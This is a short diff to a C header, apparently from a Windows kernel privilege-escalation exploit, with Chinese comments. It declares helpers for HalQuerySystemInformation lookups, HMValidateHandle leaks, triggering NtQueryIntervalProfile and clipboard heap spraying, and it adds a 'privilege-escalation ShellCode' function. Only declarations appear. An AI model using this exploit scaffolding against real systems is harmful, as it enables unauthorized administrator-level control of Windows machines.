@@ -39,3 +39,5 @@ PVOID GetHalQuerySystemInformation();					// 获取保存HalQuerySystemInformation函
 PVOID GetHMValidateHandle();							// 获取HMValidateHandle函数
 BOOL CallNtQueryIntervalProfile();						// 调用NtQueryIntervalProfile函数
 BOOL CreateClipboard(DWORD dwSize);						// 通过剪切板实现垫片操作,会产生dwSize + 0xC + 0x8的内存块
+NTSTATUS ShellCode(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength);	// 提权的ShellCode
+void ShellCodeEnd();
